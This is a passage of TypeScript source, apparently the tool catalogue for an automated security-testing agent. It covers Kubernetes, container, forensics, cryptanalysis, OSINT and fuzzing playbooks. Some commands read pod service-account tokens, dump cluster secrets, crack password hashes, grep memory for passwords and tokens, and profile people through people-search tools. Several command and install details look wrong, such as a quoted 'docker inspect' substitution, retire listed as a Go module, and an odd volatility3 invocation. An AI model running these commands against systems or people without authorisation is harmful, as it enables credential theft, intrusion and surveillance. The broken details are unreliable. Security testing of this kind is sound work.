      T("opa", "opa eval -d {out}/policies/policy.rego -i {out}/input.json 'data.main'", { go: "github.com/open-policy-agent/opa@latest" }, "conftest"),
      T("retire", "retire --path {path} --outputpath {out}/retire.json --outputformat json", { go: "github.com/retiresec/retire@latest" }, "grype dir"),
      T("osv-scanner", "osv-scanner --recursive {path} --format json > {out}/osv.json", { go: "github.com/google/osv-scanner/cmd/osv-scanner@latest" }, "grype dir"),
    ],
    notes: [
      "checkov/terrascan emit noise - report only the IDs the target actually has, with the file+line that triggered them.",
      "A fix is real only when the diff makes the finding disappear - re-run the scan after the patch to prove it.",
    ],
  },
  "container-vuln-scan": {
    phase: "surface",
    goal: "Container image CVE, secret and config scanning",
    tools: [
      T("trivy", "trivy image --format json --output {out}/trivy.json {image} || trivy fs --format json --output {out}/trivy.json {path}", { go: "github.com/aquasecurity/trivy/cmd/trivy@latest" }, "grype"),
      T("grype", "grype {image} -o json > {out}/grype.json", { go: "github.com/anchore/grype@latest" }, "trivy"),
      T("syft", "syft {image} -o spdx-json > {out}/sbom.json", { go: "github.com/anchore/syft/cmd/syft@latest" }, "docker save"),
      T("dockle", "dockle --format json {image} > {out}/dockle.json", { go: "github.com/goodoctor/dockle/cmd/dockle@latest" }, "trivy config"),
      T("dive", "dive {image} --json {out}/dive.json", { go: "github.com/wagoodman/dive/cmd/dive@latest" }, "docker history"),
      T("find", "find {path} -type f ( -name '*.pem' -o -name '*.key' -o -name '*.p12' -o -name 'id_rsa*' ) -print", { apt: "findutils" }, "trivy secret"),
    ],
    notes: [
      "Start with --severity critical,high and only report what has a fix available.",
      "dive finds secrets in image layers - a .pem in layer 3 is a finding even if no CVE exists.",
    ],
  },
  "docker-audit": {
    phase: "surface",
    goal: "Docker host CIS benchmark assessment",
    tools: [
      T("docker-bench-security", "bash {path}/docker-bench-security.sh -l {out}/docker_bench.log", { git: "https://github.com/docker/docker-bench-security" }, "docker inspect + manual checks"),
      T("docker", "docker ps -a --format 'table {{.ID}}\t{{.Image}}\t{{.Status}}\t{{.Command}}' > {out}/docker_ps.txt", { apt: "docker.io" }, "ps + /proc"),
      T("docker", "docker inspect 'docker ps -q' > {out}/docker_inspect.json", { apt: "docker.io" }, "docker-bench-security"),
      T("trivy", "trivy image --scanners vuln,secret,config {image}", { go: "github.com/aquasecurity/trivy/cmd/trivy@latest" }, "grype"),
      T("syft", "syft {image} -o spdx-json > {out}/sbom.json", { go: "github.com/anchore/syft/cmd/syft@latest" }, "docker save"),
    ],
    notes: [
      "Run docker-bench-security FIRST - it tells you where to dig inside docker inspect.",
      "Every WARN that appears on the container but not on the host is real - report it.",
    ],
  },
  "runtime-detection": {
    phase: "surface",
    goal: "Runtime security monitoring posture and rule quality",
    tools: [
      T("falco", "falco -c /etc/falco/falco.yml -e 'event.type=mkdir and fd.name starts /etc' > {out}/falco.log", { release_gh: { repo: "falcosecurity/falco", asset_regex: "falco-.*-x86_64.tar.gz", extract: "usr/bin/falco", dest: "/usr/local/bin/falco" } }, "falcoctl rules check"),
      T("falcoctl", "falcoctl artifact list && falcoctl rules add falcosecurity/rules", { go: "github.com/falcosecurity/falcoctl/cmd/falcoctl@latest" }, "hand-edit rules"),
      T("python3", "python3 {out}/gen_falco_rule.py --event {event} > {out}/custom_rule.yaml", { apt: "python3" }, "write the rule by hand"),
      T("docker", "docker exec {container} cat /proc/1/status > {out}/proc1.txt", { apt: "docker.io" }, "auditd"),
    ],
    notes: [
      "Prove coverage by running one known trigger in a sandbox container and confirming the rule fired.",
      "A rule that fires on a benign action is a false-positive defect, not a coverage win - report it as one.",
      "Falco needs the kernel event source. If it is absent, that is a real coverage gap - record it as a finding.",
    ],
  },
  "k8s-hunt": {
    phase: "surface",
    goal: "Kubernetes attack-surface discovery with kube-hunter",
    tools: [
      T("kube-hunter", "kube-hunter --remote {k8s_host} --report-json {out}/kube_hunter.json", { pip: "kube-hunter" }, "nmap on the API server"),
      T("kubectl", "kubectl get pods -A --no-headers | head -30 > {out}/k8s_pods.txt", { apt: "kubernetes-client" }, "curl the API server"),
      T("kube-bench", "kube-bench run --outputfile {out}/kube_bench.json", { go: "github.com/aquasecurity/kube-bench/cmd/kube-bench@latest" }, "CIS checklist manually"),
      T("trivy", "trivy k8s --report summary {k8s_host}", { go: "github.com/aquasecurity/trivy/cmd/trivy@latest" }, "kube-bench"),
    ],
    notes: [
      "kube-hunter remote mode is passive-first; add --active only when the operator authorised it.",
      "Report every FAIL with its CIS control id. INFO items are notes, not findings.",
    ],
  },
  "k8s-cis-audit": {
    phase: "surface",
    goal: "Kubernetes CIS benchmark compliance check",
    tools: [
      T("kube-bench", "kube-bench run --json --outputfile {out}/kube_bench.json", { go: "github.com/aquasecurity/kube-bench/cmd/kube-bench@latest" }, "CIS checklist manually"),
      T("kubescape", "kubescape scan framework nsa --output {out}/kubescape.json", { go: "github.com/kubescape/kubescape/cmd/kubescape@latest" }, "kube-bench"),
      T("kubectl", "kubectl version --short && kubectl get ns && kubectl get sa,svc -A", { apt: "kubernetes-client" }, "curl the API server"),
    ],
    notes: ["The big three CIS gaps: anonymous access on 6443, no pod security standards, unauthenticated health endpoints."],
  },
  "k8s-manifest-audit": {
    phase: "surface",
    goal: "Kubernetes manifest security analysis",
    tools: [
      T("kubesec", "kubesec scan {path}/manifest.yaml > {out}/kubesec.json", { go: "github.com/controlplaneio/kubesec@latest" }, "kube-linter"),
      T("kube-linter", "kube-linter lint {path} --format json > {out}/kube_linter.json", { go: "github.com/stackrox/kube-linter/cmd/kube-linter@latest" }, "kubescape"),
      T("kubescape", "kubescape scan {path} --output {out}/kubescape.json", { go: "github.com/kubescape/kubescape/cmd/kubescape@latest" }, "kube-linter"),
      T("kubeconform", "kubeconform -strict -summary {path}/manifest.yaml", { go: "github.com/yannh/kubeconform/cmd/kubeconform@latest" }, "kubectl --dry-run"),
    ],
    notes: [
      "A kubesec score under 30 (LOW) is a hard finding.",
      "Report a fixed manifest as a patch and re-scan it to prove the finding is gone.",
    ],
  },
  "k8s-rbac-enum": {
    phase: "surface",
    goal: "Kubernetes RBAC and cluster access enumeration",
    tools: [
      T("kubectl", "kubectl auth can-i --list -o json > {out}/can_i.json", { apt: "kubernetes-client" }, "curl the API server with the SA token"),
      T("kubectl", "kubectl get secrets -A -o json > {out}/k8s_secrets.json", { apt: "kubernetes-client" }, "kubectl get sa,rolebindings -A"),
      T("kubectl", "kubectl get sa,rolebindings -A -o json > {out}/rbac.json", { apt: "kubernetes-client" }, "kubectl auth can-i --list"),
      T("kubectl", "kubectl exec {pod} -n {ns} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > {out}/sa_token.txt", { apt: "kubernetes-client" }, "kubectl cp"),
      T("opa", "opa eval -d {out}/rbac.rego -i {out}/rbac.json 'data.main'", { go: "github.com/open-policy-agent/opa@latest" }, "conftest"),
    ],
    notes: [
      "A serviceaccount token from any pod is an identity. Enumerate what it can do BEFORE anything else.",
      "Report the shortest path to cluster-admin, not every path.",
    ],
  },
  "k8s-escape": {
    phase: "exploit",
    goal: "Pod to node to cluster escape discovery and read-only proof",
    tools: [
      T("kubectl", "kubectl exec {pod} -n {ns} -- cat /proc/1/status | head -5 > {out}/proc1.txt", { apt: "kubernetes-client" }, "docker exec"),
      T("kubectl", "kubectl exec {pod} -n {ns} -- ls -la /var/run/docker.sock /run/containerd/containerd.sock /host > {out}/socks.txt", { apt: "kubernetes-client" }, "hostPath checks"),
      T("kubectl", "kubectl exec {pod} -n {ns} -- cat /proc/self/status | grep CapEff > {out}/caps.txt", { apt: "kubernetes-client" }, "capsh --decode"),
      T("kubectl", "kubectl get pods -A -o yaml | grep -nE 'privileged: true|hostPath|docker.sock' | head -20 > {out}/priv_check.txt", { apt: "kubernetes-client" }, "kubectl get -o json"),
      T("kubectl", "kubectl auth can-i --list --as system:serviceaccount:{ns}:{sa} > {out}/sa_perms.txt", { apt: "kubernetes-client" }, "kubectl auth can-i --list"),
    ],
    notes: [
      "Five escape roads: hostPath mounts, privileged containers, docker.socket, CAP_SYS_ADMIN, SA impersonation.",
      "Prove an escape with one read-only command that could not run before the escalation, and state what it proved.",
      "Never delete or restart a workload to make a point. Read-only proof is always enough.",
    ],
  },
  "helm-audit": {
    phase: "surface",
    goal: "Helm chart and release assessment",
    tools: [
      T("helm", "helm list --all-namespaces --output json > {out}/helm_list.json", { go: "helm.sh/helm/v3/cmd/helm@latest" }, "read chart YAML"),
      T("helm", "helm get all {release} -n {ns} > {out}/helm_all.yaml", { go: "helm.sh/helm/v3/cmd/helm@latest" }, "helm template"),
      T("helm", "helm template --validate {chart} > {out}/rendered.yaml && kubesec scan {out}/rendered.yaml", { go: "helm.sh/helm/v3/cmd/helm@latest" }, "kube-linter"),
    ],
    notes: ["helm get all is the source of truth for image tags, pull secrets and hostPath in the landing zone."],
  },
  "istio-audit": {
    phase: "surface",
    goal: "Istio service mesh configuration analysis",
    tools: [
      T("istioctl", "istioctl version && istioctl x describe pod {pod}", { go: "istio.io/istio/cmd/istioctl@latest" }, "read mesh config CRDs"),
      T("istioctl", "istioctl x check-injection --mesh-config {out}/mesh.yaml", { go: "istio.io/istio/cmd/istioctl@latest" }, "istioctl probe"),
      T("istioctl", "istioctl proxy-config all {pod} -n {ns} -o json > {out}/sidecar.json", { go: "istio.io/istio/cmd/istioctl@latest" }, "dump the configmap"),
    ],
    notes: ["PeerAuthentication absent = mTLS off - a real finding for east-west traffic."],
  },

  /* ---------------- forensics ---------------- */
  "forensics-disk": {
    phase: "forensics",
    goal: "Filesystem forensics: partition map, file carving, timeline",
    tools: [
      T("sleuthkit", "mmls {img} > {out}/mmls.txt && fls -r -p {img} > {out}/fls.txt", { apt: "sleuthkit" }, "photorec"),
      T("photorec", "photorec /d {out}/carve /rec {img} > /dev/null", { apt: "testdisk" }, "scalpel"),
      T("foremost", "foremost -i {img} -o {out}/foremost -q", { apt: "foremost" }, "scalpel"),
      T("scalpel", "scalpel -c /etc/scalpel/scalpel.conf -o {out}/scalpel {img}", { apt: "scalpel" }, "foremost"),
      T("bulk-extractor", "bulk_extractor -o {out}/bulk {img}", { apt: "bulk-extractor" }, "foremost"),
      T("testdisk", "testdisk /dev/{disk} -d -R > {out}/testdisk.log", { apt: "testdisk" }, "mmls + fls"),
      T("sha256sum", "sha256sum {img} > {out}/hash.txt && stat {img} > {out}/stat.txt", { apt: "coreutils" }, "stat"),
    ],
    notes: [
      "Work on a COPY of the disk, never the original. Hash both and note any mismatch.",
      "fls output is the map - grep it first, then icat/sleuthkit block the exact inode you care about.",
      "Every carved file goes into its own directory with a hash. A file without a hash is not evidence.",
    ],
  },
  "forensics-memory": {
    phase: "forensics",
    goal: "Memory forensics with Volatility 2 and Volatility 3",
    tools: [
      T("vol3", "python3 -m volatility3.cli.pslist -f {dump} > {out}/pslist.txt", { pip: "volatility3" }, "volatility"),
      T("vol3", "python3 -m volatility3.cli.netstat -f {dump} > {out}/netstat.txt", { pip: "volatility3" }, "volatility"),
      T("vol3", "python3 -m volatility3.cli.userassist -f {dump} > {out}/exec_chain.txt", { pip: "volatility3" }, "volatility"),
      T("volatility", "volatility -f {dump} imageinfo > {out}/imageinfo.txt", { apt: "volatility" }, "vol3"),
      T("volatility", "volatility -f {dump} pslist > {out}/pslist2.txt", { apt: "volatility" }, "vol3"),
      T("strings", "strings -el {dump} | grep -iE 'password|https?://|cookie|token' | head -200 > {out}/mem_strings.txt", { apt: "binutils" }, "bulk-extractor"),
    ],
    notes: [
      "vol3 uses dotted plugin paths (python -m volatility3.cli.<plugin>); vol2 uses snake_case plugin names. Match the version you run.",
      "A process with no file backing or executable memory outside the image is suspicious - malfind is the first check.",
      "Hollowing may have no searchable strings - use malfind, not strings, to find it.",
    ],
  },
  "sleuthkit-analysis": {
    phase: "forensics",
    goal: "Sleuth Kit inode analysis and deleted file recovery",
    tools: [
      T("sleuthkit", "fls -r -p {img} > {out}/files.txt && icat {img} {inode} > {out}/recovered.bin", { apt: "sleuthkit" }, "photorec"),
      T("sleuthkit", "ils -e {img} > {out}/inodes.txt && ils {img} > {out}/deleted.txt", { apt: "sleuthkit" }, "fls"),
      T("sleuthkit", "img_stat {img} && fls -m {mount} -r {img} > {out}/mactime.csv", { apt: "sleuthkit" }, "autopsy"),
    ],
    notes: ["mmls + ils reveal unallocated data - deleted files still on disk are the highest-value find."],
  },
  "autopsy-timeline": {
    phase: "forensics",
    goal: "Autopsy-driven analysis and timeline construction",
    tools: [
      T("autopsy", "autopsy -h > {out}/autopsy_help.txt 2>&1", { apt: "autopsy" }, "sleuthkit"),
      T("sleuthkit", "fls -m {mount} -r {img} > {out}/mactime.csv", { apt: "sleuthkit" }, "autopsy"),
      T("python3", "python3 {out}/gen_timeline.py --mactime {out}/mactime.csv --out {out}/timeline.md", { apt: "python3" }, "grep + sort"),
    ],
    notes: ["A timeline shows WHEN an attacker interacted, not just what exists - it is the risk-reduction deliverable."],
  },
  "stego": {
    phase: "forensics",
    goal: "Hidden data in images",
    tools: [
      T("steghide", "steghide extract -sf {file} -p {password} -xf {out}/extracted.bin || steghide info {file}", { apt: "steghide" }, "binwalk"),
      T("outguess", "outguess -r {file} {out}/outguess.bin", { apt: "outguess" }, "steghide"),
      T("zsteg", "zsteg {file} > {out}/zsteg.txt", { gem: "zsteg" }, "binwalk"),
      T("stegsolve", "stegsolve {file}", { release_gh: { repo: "StegoSuite/stegsolve", asset_regex: "stegsolve.*.deb", install_cmd: "dpkg -i" } }, "python3 PIL bit-plane view"),
      T("binwalk", "binwalk -e -C {out}/binwalk {file}", { pip: "binwalk" }, "unblob"),
      T("exiftool", "exiftool -all {file} > {out}/exif.txt", { apt: "libimage-exiftool-perl" }, "strings"),
      T("python3", "python3 -c 'import hashlib,sys; print(hashlib.sha256(sys.stdin.buffer.read()).hexdigest())' < {file}", { apt: "python3" }, "sha256sum"),
    ],
    notes: [
      "Try empty + common passwords first: password, admin, root, 123456, cyberchef, the flag format if known.",
      "A hit is confirmation only when the extracted bytes decode to something - check it before calling it a finding.",
      "stegsolve's LSB bit-plane view looks noisy when data is hidden - it is the fastest visual check.",
    ],
  },
  "metadata-audit": {
    phase: "forensics",
    goal: "Document and image metadata review",
    tools: [
      T("exiftool", "exiftool -a -u -G1 {file} > {out}/meta.txt", { apt: "libimage-exiftool-perl" }, "pdftotext"),
      T("exiftool", "exiftool -gps:all -a -u -b {file} > {out}/gps.txt", { apt: "libimage-exiftool-perl" }, "exiftool"),
      T("python3", "python3 -c 'import zipfile,sys; print(zipfile.ZipFile(sys.argv[1]).read(\"docProps/core.xml\").decode())' {file}", { apt: "python3" }, "exiftool"),
      T("pdftotext", "pdftotext {file} {out}/text.txt", { apt: "poppler-utils" }, "strings"),
    ],
    notes: [".docx/.xlsx are zip containers - unzip and read docProps/core.xml for real authorship and edit history."],
  },

  /* ---------------- crypto & hashes ---------------- */
  "hash-identify": {
    phase: "surface",
    goal: "Hash type identification with confidence scoring",
    tools: [
      T("hashID", "hashID {hash}", { go: "github.com/psypanda/hashID@latest" }, "hash_identify"),
      T("hash_identify", "hash_identify --data '{hash}' --json", { local: "hash_identify.py" }, "hashID"),
      T("python3", "python3 -c 'import sys; s=sys.argv[1]; print(len(s), sum(c.isalnum() for c in s))' '{hash}'", { apt: "python3" }, "hash_identify"),
    ],
    notes: [
      "Identify FIRST. Wrong mode = wasted GPU hours and a wrong answer.",
      "Two tools agreeing beats one. If hashID and hash_identify disagree, the explanation wins.",
      "JSON output feeds straight into raptor_finding - keep the evidence with the mode.",
    ],
  },
  "hash-crack": {
    phase: "exploit",
    goal: "Password recovery for a candidate hash",
    tools: [
      T("hashcat", "hashcat -a 0 -m {mode} '{hash}' {out}/words.txt --username -o {out}/cracked.txt", { apt: "hashcat" }, "john"),
      T("john", "john --format={john_format} {out}/hash.txt --wordlist={out}/words.txt", { apt: "john" }, "hashcat"),
      T("john", "john --wordlist={out}/words.txt --rules=best64 {out}/hash.txt", { apt: "john" }, "hashcat with rules"),
      T("python3", "python3 {out}/bruteforce.py --chars 'lower+digits' --max 6 > {out}/candidates.txt", { apt: "python3" }, "crunch"),
    ],
    notes: [
      "Always show the plaintext with the hash that matched it. A match with no plaintext output is unproven.",
      "For salted formats target ONE representative hash, not the whole dump.",
      "No crack after 15 min is a valid result - the finding is then 'hash does not expose a weak password'.",
    ],
  },
  "cipher-analysis": {
    phase: "exploit",
    goal: "Identify a classic cipher or encoding and decode it",
    tools: [
      T("cipher_identify", "cipher_identify --data '{blob}' --json", { local: "cipher_identify.py" }, "python3 base64"),
      T("freq_analysis", "freq_analysis --text '{blob}' --json", { local: "freq_analysis.py" }, "cipher_identify"),
      T("cyberchef_ops", "cyberchef_ops --op base64-decode --data '{blob}'", { local: "cyberchef_ops.py" }, "openssl"),
      T("python3", "python3 -c 'import base64,sys; print(base64.b64decode(sys.argv[1]))' '{blob}'", { apt: "python3" }, "cyberchef_ops"),
    ],
    notes: [
      "Try the cheapest route first - if it decodes to printable ASCII in one hop, you are done.",
      "Vigenere/substitution starts with freq_analysis, never with the spelling-out method.",
    ],
  },
  "frequency-crack": {
    phase: "exploit",
    goal: "Break a monoalphabetic substitution with statistical analysis",
    tools: [
      T("freq_analysis", "freq_analysis --text '{ciphertext}' --json", { local: "freq_analysis.py" }, "python3 collections"),
      T("cyberchef_ops", "cyberchef_ops --op rot13 --data '{ciphertext}'", { local: "cyberchef_ops.py" }, "python3 str.translate"),
      T("python3", "python3 {out}/break_subst.py --cipher '{ciphertext}' --out {out}/break.json", { apt: "python3" }, "freq_analysis"),
    ],
    notes: ["Report the cracked plaintext IN FULL, with the frequency table that justified it."],
  },
  "rsa-analysis": {
    phase: "exploit",
    goal: "RSA weakness analysis and plaintext recovery",
    tools: [
      T("rsa_tool", "rsa_tool --n {n} --e {e} --c {c} --json", { local: "rsa_tool.py" }, "python3 sympy"),
      T("rsa_tool", "rsa_tool --key {pem} --json", { local: "rsa_tool.py" }, "openssl rsa -text"),
      T("factor_db", "factor_db --n {n}", { local: "factor_db.py" }, "openssl rsa -text"),
      T("openssl", "openssl rsa -in {pem} -text -noout", { apt: "openssl" }, "python3 cryptography"),
      T("python3", "python3 -c 'import math,sys; print(math.gcd(int(sys.argv[1]),int(sys.argv[2])))' {n1} {n2}", { apt: "python3" }, "rsa_tool --gcd-with"),
    ],
    notes: [
      "Report the weakness, the math, AND the recovered plaintext wherever you have it.",
      "A shared prime across two moduli means both are broken - report both.",
      "Never report a factorization you did not compute. Pollard rho not converging is a result, not a failure.",
    ],
  },

  /* ---------------- bug bounty + OSINT arsenal ---------------- */
  "subsiege": {
    phase: "recon",
    goal: "Full subdomain pipeline: sources, resolution, HTTP triage",
    tools: [
      T("subfinder", "subfinder -d {target} -all -silent -o {out}/subs.txt", { go: "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" }, "amass"),
      T("amass", "amass enum -passive -d {target} -o {out}/amass.txt", { apt: "amass" }, "subfinder"),
      T("dnsx", "dnsx -l {out}/all_subs.txt -silent -a -resp -o {out}/resolved.txt", { go: "github.com/projectdiscovery/dnsx/cmd/dnsx@latest" }, "dig +short A"),
      T("httpx", "httpx -l {out}/resolved.txt -silent -status-code -title -tech-detect -o {out}/live.txt", { go: "github.com/projectdiscovery/httpx/cmd/httpx@latest" }, "curl -I"),
      T("dnsenum", "dnsenum --no-whois {target} > {out}/dnsenum.txt", { apt: "dnsenum" }, "dig +noall +answer"),
      T("fierce", "fierce --domain {target} > {out}/fierce.txt", { pip: "fierce" }, "dnsenum"),
      T("theHarvester", "theHarvester -d {target} -b all -f {out}/harvester.html", { pip: "theHarvester" }, "amass"),
      T("alterx", "alterx -l {out}/subs.txt -n 1500 | sort -u | dnsx -silent -a -o {out}/alterx_resolved.txt", { go: "github.com/projectdiscovery/alterx/cmd/alterx@latest" }, "puredns bruteforce"),
    ],
    notes: [
      "Merge every source into all_subs.txt BEFORE resolving. One resolution pass, not one per source.",
      "Report takeover-prone CNAMEs separately from resolved hosts - they are different actions.",
    ],
  },
  "subdomain-takeover": {
    phase: "recon",
    goal: "Subdomain takeover discovery and confirmation",
    tools: [
      T("subjack", "subjack -w {out}/all_subs.txt -ssl -v -o {out}/takeover.txt", { go: "github.com/haccer/subjack@latest" }, "nuclei -tags takeover"),
      T("subzy", "subzy run --targets {out}/all_subs.txt -o {out}/subzy.txt", { go: "github.com/PentestPad/subzy@latest" }, "subjack"),
      T("nuclei", "nuclei -tags takeover -l {out}/resolved.txt -silent -o {out}/takeover_nuclei.txt", { go: "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" }, "manual CNAME check"),
      T("dig", "dig +short CNAME {sub}", { apt: "dnsutils" }, "dnsx -cname"),
    ],
    notes: [
      "A subzy/subjack hit is a candidate. The finding is real only when the claim path is verifiable.",
      "Never register a domain just to prove it - describe the claim path (service, expected response, control you would gain) and cite the stale service name.",
    ],
  },
  "param-spider": {
    phase: "surface",
    goal: "Parameter discovery from archives and the live app",
    tools: [
      T("paramspider", "python3 {path}/main.py {target} > {out}/params.json", { git: "https://github.com/devanshbatham/ParamSpider" }, "arjun"),
      T("arjun", "arjun -u {url} -m GET,POST -o {out}/arjun.json", { pip: "arjun" }, "x8"),
      T("waymore", "waymore -i {target} -mode U -o {out}/waymore.txt", { go: "github.com/xnl-h4ck3r/waymore@latest" }, "gau"),
      T("gau", "gau {target} > {out}/gau.txt", { go: "github.com/lc/gau/v2/cmd/gau@latest" }, "waybackurls"),
      T("katana", "katana -u {url} -d 3 -jc -kf all -silent -o {out}/katana.txt", { go: "github.com/projectdiscovery/katana/cmd/katana@latest" }, "hakrawler"),
      T("hakrawler", "echo {url} | hakrawler -d 2 -subs > {out}/hakrawler.txt", { go: "github.com/hakluke/hakrawler@latest" }, "katana"),
    ],
    notes: ["paramspider pulls from archives: it gives you old parameter keys, not live ones - cross-check against httpx."],
  },
  "secret-hunt-git": {
    phase: "surface",
    goal: "Secret hunting in source trees and git history",
    tools: [
      T("trufflehog", "trufflehog git https://github.com/{org}/{repo} --only-verified --json > {out}/trufflehog.json", { go: "github.com/trufflesecurity/trufflehog@latest" }, "gitleaks"),
      T("detect-secrets", "detect-secrets scan {path} --json > {out}/detect_secrets.json", { pip: "detect-secrets" }, "trufflehog"),
      T("gitleaks", "gitleaks git {repo} -v --redact", { go: "github.com/gitleaks/gitleaks@latest" }, "trufflehog"),
      T("trufflehog", "trufflehog filesystem {path} --no-update", { go: "github.com/trufflesecurity/trufflehog@latest" }, "detect-secrets"),
    ],
    notes: [
      "trufflehog --only-verified is the first pass; unverified hits only after you have the verified set.",
      "Never paste a secret into a report body. Name the type, location, and an 8-character fingerprint.",
      "A secret that fails auth is still a leak if it has historical meaning - say which it is.",
    ],
  },
  "osint-platform": {
    phase: "recon",
    goal: "Public platform intelligence with the extended arsenal",
    tools: [
      T("theHarvester", "theHarvester -d {domain} -b all -f {out}/harvester.html", { pip: "theHarvester" }, "amass"),
      T("social-analyzer", "social-analyzer --username '{handle}' --profile 'info' --type 'media+profile' > {out}/social.json", { git: "https://github.com/iojw/social-analyzer" }, "sherlock"),
      T("recon-ng", "recon-ng -m twitter,linkedin,instagram -d {target}", { apt: "recon-ng" }, "theHarvester"),
      T("spiderfoot", "spiderfoot --scan {target} --output json > {out}/sf.json", { pip: "spiderfoot" }, "theHarvester"),
      T("maltego", "maltego-launcher --config {out}/mtg_spec.json", { url: "https://downloads.maltego.com/maltego-latest/MaltegoCE-linux.tar.gz", dest: "/opt/maltego", extract: true }, "recon-ng"),
      T("shodan", "shodan search --fields ip_str,port,transport,org '{field}' --limit 50 > {out}/shodan.txt", { pip: "shodan" }, "censys"),
      T("censys", "censys search --limit 50 '{field}' --write {out}/censys.json", { pip: "censys" }, "shodan"),
      T("holehe", "holehe {email} --no-color -o {out}/holehe.txt", { pip: "holehe" }, "websearch"),
      T("hibp", "hibp --breaches {email}", { local: "hibp_lookup.py" }, "websearch"),
      T("pipl", "pipl --query {identifier}", { local: "pipl_lookup.py" }, "privdata people search"),
    ],
    notes: [
      "shodan/censys/uncover have free tiers - say which tier you used when reporting.",
      "holehe is a per-provider registration probe, not an account takeover.",
      "pipl needs a key. No key configured is a real result - do not fabricate.",
    ],
  },
  "shodan-recon": {
    phase: "recon",
    goal: "Internet-connected asset discovery with shodan",
    tools: [
      T("shodan", "shodan search --limit 50 --fields ip_str,port,transport,org '{field}' > {out}/shodan.txt", { pip: "shodan" }, "uncover"),
      T("shodan", "shodan host {ip}", { pip: "shodan" }, "censys"),
      T("uncover", "uncover -q '{query}' -o {out}/uncover.txt", { go: "github.com/projectdiscovery/uncover@latest" }, "shodan"),
      T("asnmap", "asnmap {org} > {out}/asn.txt", { go: "github.com/projectdiscovery/asnmap/cmd/asnmap@latest" }, "bgpview"),
      T("mapcidr", "mapcidr -cidr {cidr} -agg > {out}/cidr.txt", { go: "github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest" }, "bgpview"),
      T("cdncheck", "cdncheck -i {host}", { go: "github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest" }, "wafw00f"),
    ],
    notes: ["Report shodan results as 'asset seen at <date>' with the raw response you actually received."],
  },
  "censys-recon": {
    phase: "recon",
    goal: "Certificate-surface collection with censys",
    tools: [
      T("censys", "censys search --limit 50 'services.tls.certificates.leaf.subject: {host}' --output json > {out}/censys.json", { pip: "censys" }, "shodan"),
      T("censys", "censys search --limit 50 'dns.names: {host}' --output json > {out}/censys_dns.json", { pip: "censys" }, "certspotter"),
      T("curl", "curl -s 'https://crt.sh/?q=%25.{host}&output=json'", { apt: "curl" }, "censys"),
      T("uncover", "uncover -q '{host}' -r censys -o {out}/uncover.txt", { go: "github.com/projectdiscovery/uncover@latest" }, "censys"),
    ],
    notes: ["censys cert search exposes SAN hosts no subdomain tool finds. Keep it one more merge source."],
  },
  "aquatone-survey": {
    phase: "surface",
    goal: "Visual inventory of every live host with aquatone",
    tools: [
      T("aquatone", "aquatone -out {out}/aquatone -n 8 -t 10m < {out}/live.txt", { git: "https://github.com/fireeye/aquatone" }, "gospider + headless chrome"),
      T("gospider", "gospider -S {out}/live.txt -q -s -d 3 -o {out}/gospider", { go: "github.com/jaeles-project/gospider@latest" }, "katana"),
    ],
    notes: ["Aquatone's HTML report is the deliverable you replay to the operator - attach screenshots, not markup."],
  },

  /* ---------------- exploit dev & fuzzing ---------------- */
  "fuzz-binary": {
    phase: "exploit",
    goal: "Coverage-guided fuzzing campaign on a binary or parser",
    tools: [
      T("afl-fuzz", "afl-fuzz -i {in_dir} -o {out_dir} -- {bin} @@ > {out}/afl.log", { apt: "afl-fuzz" }, "honggfuzz"),
      T("honggfuzz", "honggfuzz -i {in_dir} --output {out_dir} -- {bin} > {out}/honggfuzz.log", { apt: "honggfuzz" }, "afl-fuzz"),
      T("angr", "python3 {out}/angr_harness.py --target {bin} --find '{path}' > {out}/angr.json", { pip: "angr" }, "manual symbolic walk"),
      T("python3", "python3 {out}/fuzz_harness.py --target {bin} --out {out}/crashes.txt", { apt: "python3" }, "afl-fuzz"),
    ],
    notes: [
      "Start AFL with a seeded corpus - a random corpus produces noise that proves nothing.",
      "Every crash is a candidate until you reproduce it 3 times with the same input.",
      "For protocol fuzzers, seed with a real capture - that gives real structure to fuzz.",
    ],
  },
  "symbolic-exec": {
    phase: "exploit",
    goal: "Symbolic execution for constraint solving",
    tools: [
      T("angr", "python3 {out}/sym_exec.py --binary {bin} --find '{path}' > {out}/angr.json", { pip: "angr" }, "pwnlib symbolic walk"),
      T("python3", "python3 {out}/sym_exec2.py --binary {bin} > {out}/angr2.json", { pip: "angr" }, "angr"),
    ],
    notes: [
      "angr needs explicit find/avoid paths - without both it is a loop generator, not an exploit tool.",
      "angr returns the constraint set, not a payload. Convert it to an input string explicitly.",
    ],
  },
}

const TOOL_SPECS: Record<string, Install> = {
  subfinder: { apt: "subfinder", go: "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" },
  amass: { apt: "amass" },
  assetfinder: { go: "github.com/tomnomnom/assetfinder@latest" },
  findomain: { go: "github.com/Findomain/Findomain@latest" },
  shuffledns: { go: "github.com/projectdiscovery/shuffledns@latest" },
  puredns: { go: "github.com/six2dez/puredns@latest" },
  dnsx: { go: "github.com/projectdiscovery/dnsx/cmd/dnsx@latest" },
  tlsx: { go: "github.com/projectdiscovery/tlsx/cmd/tlsx@latest" },
  httpx: { go: "github.com/projectdiscovery/httpx/cmd/httpx@latest" },
  naabu: { go: "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest" },
  masscan: { apt: "masscan" },
  rustscan: { cargo: "rustscan" },
  katana: { go: "github.com/projectdiscovery/katana/cmd/katana@latest" },
  gau: { go: "github.com/lc/gau/v2/cmd/gau@latest" },
  waybackurls: { go: "github.com/tomnomnom/waybackurls@latest" },
  urlfinder: { go: "github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest" },
  ffuf: { go: "github.com/ffuf/ffuf/v2@latest" },
  gobuster: { apt: "gobuster" },
  feroxbuster: { cargo: "feroxbuster" },
  dirsearch: { pip: "dirsearch" },
  arjun: { pip: "arjun" },
  x8: { go: "github.com/Sh1Yo/x8@latest" },
  nuclei: { go: "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" },
  nikto: { apt: "nikto" },
  wafw00f: { apt: "wafw00f" },
  whatweb: { apt: "whatweb" },
  nmap: { apt: "nmap" },
  sqlmap: { apt: "sqlmap" },
  sqlninja: { apt: "sqlninja" },
  ghauri: { pip: "ghauri" },
  nosqlmap: { pip: "nosqlmap" },
  dalfox: { go: "github.com/hahwul/dalfox/v2@latest" },
  xsser: { git: "https://github.com/xsscout/xsser" },
  ssrfmap: { pip: "ssrfmap" },
